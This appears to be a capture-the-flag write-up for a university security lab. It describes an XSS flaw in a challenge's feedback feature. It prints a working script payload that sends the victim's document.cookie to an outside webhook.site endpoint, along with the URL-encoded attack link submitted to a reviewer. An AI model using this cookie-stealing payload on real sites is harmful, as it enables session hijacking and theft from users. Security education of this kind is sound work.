# Challenge `My favourite cookies` writeup

- **Vulnerability:** XSS
- **Where:** in feedback
- **Impact:** Allows injection of \<script\> tag and execution of arbitrary script

## Steps to reproduce

1. Create a request bin in **webhook.site**
1. Create a script that requests the created endpoint and sends the user cookie as a query parameter: `<script>var i = new Image; i.src= "https://webhook.site/3cf170ec-fafe-4c0a-83be-50f34d4429f9?q=" + document.cookie</script>`. This script leverages the use of HTML images to automatically request source URL.
1. Insert into feedback URL bar after URL encoding `http://mustard.stt.rnl.tecnico.ulisboa.pt:22251/?search=%3Cscript%3Evar+i+%3D+new+Image%3B+i.src%3D+%22https%3A%2F%2Fwebhook.site%2F3cf170ec-fafe-4c0a-83be-50f34d4429f9%3Fq%3D%22+%2B+document.cookie%3C%2Fscript%3E` for the reviewer to access a page with a malicious search query. The description does not matter.
1. Submit feedback and get the flag from webhook website.
